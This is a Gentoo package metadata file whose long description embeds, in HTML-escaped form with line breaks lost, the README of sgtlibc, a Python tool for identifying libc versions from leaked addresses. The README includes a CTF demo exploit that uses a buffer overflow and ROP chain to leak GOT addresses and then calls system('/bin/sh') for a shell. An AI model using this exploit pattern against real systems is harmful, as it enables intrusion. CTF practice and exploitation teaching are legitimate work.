<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE pkgmetadata SYSTEM "http://www.gentoo.org/dtd/metadata.dtd">
<pkgmetadata>
	<maintainer type="person">
		<email>gentoo@houseofsuns.org</email>
		<name>Markus Walter</name>
	</maintainer>
	<longdescription>&lt;p align=&quot;center&quot;&gt;    &lt;a href=&quot;https://github.com/serfend/sgtlibc/&quot;&gt;&lt;img alt=&quot;pypi version&quot; src=&quot;https://visitor-badge.glitch.me/badge?page_id=serfend/sgtlibc&amp;left_text=views&quot; /&gt;&lt;/a&gt;     &lt;a href=&quot;https://pypi.python.org/pypi/sgtlibc/&quot;&gt;&lt;img alt=&quot;pypi version&quot; src=&quot;https://img.shields.io/pypi/v/sgtlibc.svg&quot; /&gt;&lt;/a&gt;     &lt;a href=&quot;https://pypistats.org/packages/sgtlibc&quot;&gt;&lt;img alt=&quot;pypi download&quot; src=&quot;https://img.shields.io/pypi/dm/sgtlibc.svg&quot; /&gt;&lt;/a&gt;    &lt;a href=&quot;https://github.com/serfend/sgtlibc/releases&quot;&gt;&lt;img alt=&quot;GitHub release&quot; src=&quot;https://img.shields.io/github/release/serfend/sgtlibc.svg?style=flat-square&quot; /&gt;&lt;/a&gt;    &lt;a href=&quot;https://github.com/serfend/sgtlibc/releases&quot;&gt;&lt;img alt=&quot;GitHub All Releases&quot; src=&quot;https://img.shields.io/github/downloads/serfend/sgtlibc/total.svg?style=flat-square&amp;color=%2364ff82&quot; /&gt;&lt;/a&gt;    &lt;a href=&quot;https://github.com/serfend/sgtlibc/commits&quot;&gt;&lt;img alt=&quot;GitHub last commit&quot; src=&quot;https://img.shields.io/github/last-commit/serfend/sgtlibc.svg?style=flat-square&quot; /&gt;&lt;/a&gt;    &lt;!-- &lt;a href=&quot;https://github.com/serfend/sgtlibc/actions/workflows/pytest.yml&quot;&gt;&lt;img alt=&quot;GitHub Workflow Status&quot; src=&quot;https://github.com/serfend/sgtlibc/actions/workflows/pytest.yml/badge.svg&quot; /&gt;&lt;/a&gt; --&gt;&lt;/p&gt;![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&amp;logo=windows&amp;logoColor=white)![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&amp;logo=linux&amp;logoColor=black)![Ubuntu](https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&amp;logo=ubuntu&amp;logoColor=white)![Kali](https://img.shields.io/badge/Kali-268BEE?style=for-the-badge&amp;logo=kalilinux&amp;logoColor=white)![FreeBSD](https://img.shields.io/badge/-FreeBSD-%23870000?style=for-the-badge&amp;logo=freebsd&amp;logoColor=white)![Deepin](https://img.shields.io/badge/Deepin-007CFF?style=for-the-badge&amp;logo=deepin&amp;logoColor=white)![Debian](https://img.shields.io/badge/Debian-D70A53?style=for-the-badge&amp;logo=debian&amp;logoColor=white)![Cent OS](https://img.shields.io/badge/cent%20os-002260?style=for-the-badge&amp;logo=centos&amp;logoColor=F0F0F0)# What?[sgtlibc](https://github.com/serfend/sgtlibc) is a a offline python-lib for search libc function.## Install```shellpip install sgtlibc```## Usage```shellusage: sgtlibc [-h] [-d [DUMP ...]] [-i [INDEX]] [-s [SYMBOLS]] [-u [UPDATE]] [-v [VERSION]] [funcs_with_addresses]a offline python-lib for search libc function.for search version of libc.you can use like:`sgtlibc puts:aa0+read:140 --dump system binsh` or in python , like : `py:import sgtlibc;s =sgtlibc.LibcSearcher();s.add_condition('puts',0xaa0)`positional arguments:  funcs_with_addresses  specify `func-name` and `func address` , split by `|`,eg: puts:aa0+read:140 , its means func-puts address = 0xaa0;func-read address = 0x140 (default: None).options:  -h, --help            show this help message and exit  -d [DUMP ...], --dump [DUMP ...]                        select funcs to dump its info (default: ['__libc_start_main_ret', 'system', 'dup2', 'read', 'write', 'str_bin_sh']).  -i [INDEX], --index [INDEX]                        db index on multi-database found occation (default: 0).  -s [SYMBOLS], --symbols [SYMBOLS]                        convert libc-elf file to symbols-file,use `libc_path [alias]` to convert.  -u [UPDATE], --update [UPDATE]                        update current libc database from internet , need non-microsoft-windows environment (default: False).  -v [VERSION], --version [VERSION]                        show version```## Quick Start- in cmd.exe` or `/bin/sh````shellsgtlibc puts:aa0sgtlibc puts:aa0+read:140sgtlibc puts:aa0+read:140 --dump system binsh```- in `python3````pythonimport sgtlibcs = sgtlibc.Searcher()s.add_condition('puts', 0xaa0)s.add_condition('read',0x140)print(s.dump())print(s.dump(['system','str_bin_sh']))```## Example- `main args` specify `func-name` and `func address` ,**SHOULD split by `|` **  eg: `puts:aa0+read:140` which means:  - func-`puts` address = `0xaa0`  - func-`read` address =` 0x140`- `--update` is for update libc database from internet base on `libc-database` , **require non-microsoft-window**  system### python run- run [python code above](/#/Quick Start) , you'll get output-result like following shows:![image-20220605212842313](https://raw.githubusercontent.com/serfend/res.image.reference/main/image-20220605212842313.png)### command run- run command in terminal , you'll get output-result like following shows:  ![image-20220605213023151](https://raw.githubusercontent.com/serfend/res.image.reference/main/image-20220605213023151.png)### pwntools run- use in `pwntools````pythonfrom pwn import * # should run pip install pwntools beforeimport sgtlibcs = libc.Searcher()puts_addr = 0xf71234567aa0 # from leak datas.add_condition('puts',puts_addr)s.dump(db_index=0) # search libc , if returns multi-result ,default use index-0's resultsystem_addr = p00(s.get_address(sgtlibc.s_system))binsh_addr = p00(s.get_address(sgtlibc.s_binsh))```### use user-libc database&gt; search libc from user-directory```pythonfrom sgtlibc.utils import configuration as configdef test_use_user_libc():    lib_path = './libs' # here input your libc directory    config.set(config.extension_database_path, lib_path)    s = LibcSearcher('puts', 0xf7007)    s.decided()```### add user-libc database&gt; add a libc.so file to database```bashsgtlibc -s ./libc.from_user.so:alias_input_here```or```pythonfrom sgtlibc.main import do_symbolsdo_symbols(f'./libc.from_user.so:alias_input_here')```## CTF Problem Solve DEMO[view all sameple files](https://github.com/serfend/sgtlibc/tree/main/samples/libc-leak/x64-babyrop)- use exploit code```pythonimport sgtlibcfrom sgtlibc.gamebox import *set_config(GameBoxConfig(    is_local=True, file='./babyrop2', remote='192.168.0.1:25462',    auto_load=True,    auto_show_rop=True,    auto_show_summary=True,    auto_start_game=True,    auto_load_shell_str=True,    auto_show_symbols=True))s = sgtlibc.Searcher()elf = client.elfdef exp():payload_exp = [b'a' * (28 + 4),fakeebp()] # overflow position    return payload_expdef leak(func: str):    payload = exp()    # here will auto-pack to p64, you can use p64 or p00 as same effect.    payload += [elf.rop['rdi'],elf.got[func],elf.plt['printf'],elf.symbols['main']]    sl(payload)    rl()    data = rc(6).ljust(8, b'\0')    data = uc(data)    s.add_condition(func, data)    return dataleak('printf')leak('read')data = s.dump(db_index=2)  # choose your system indexsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)log.info(f'system_addr:{hex(system_addr)}')log.info(f'binsh_addr:{hex(binsh_addr)}')payload = exp() payload += [elf.rop['rdi'],binsh_addr,system_addr, fakeebp()]    sl(payload)interactive()```- result![image-20220609134743902](https://raw.githubusercontent.com/serfend/res.image.reference/main/image-20220609134743902.png)## Notice&gt; default libc database is update on `2022-06-01`,which long-time ago , we fully recommanded to update it by run `sgtlibc --update`## Status![Alt](https://repobeats.axiom.co/api/embed/7d8920fddffed00ee7feb8d172bc7b48c86da3b8.svg &quot;Repobeats analytics image&quot;)</longdescription>
</pkgmetadata>